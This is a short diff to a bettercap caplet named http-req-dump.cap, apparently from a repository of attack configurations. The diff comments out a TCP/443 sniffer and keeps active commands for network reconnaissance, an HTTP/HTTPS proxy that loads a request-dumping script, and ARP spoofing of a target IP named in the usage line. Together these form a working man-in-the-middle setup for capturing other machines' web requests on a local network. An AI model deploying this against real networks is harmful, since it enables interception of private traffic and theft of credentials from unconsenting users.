@@ -2,21 +2,22 @@
 #
 #   sudo ./bettercap-ng -caplet caplets/http-req-dump.cap -eval "set arp.spoof.targets 192.168.1.64"
 
-events.stream off
+# events.stream off
 
 net.recon on
 net.probe on
 sleep 1
 net.probe off
 
-set net.sniff.verbose false
-set net.sniff.local true
-set net.sniff.filter tcp port 443
-net.sniff on
+# set net.sniff.verbose false
+# set net.sniff.local true
+# set net.sniff.filter tcp port 443
+# net.sniff on
 
 set https.proxy.script caplets/http-req-dump.js
 set http.proxy.script caplets/http-req-dump.js
 clear
+
 http.proxy on
 https.proxy on
 arp.spoof on
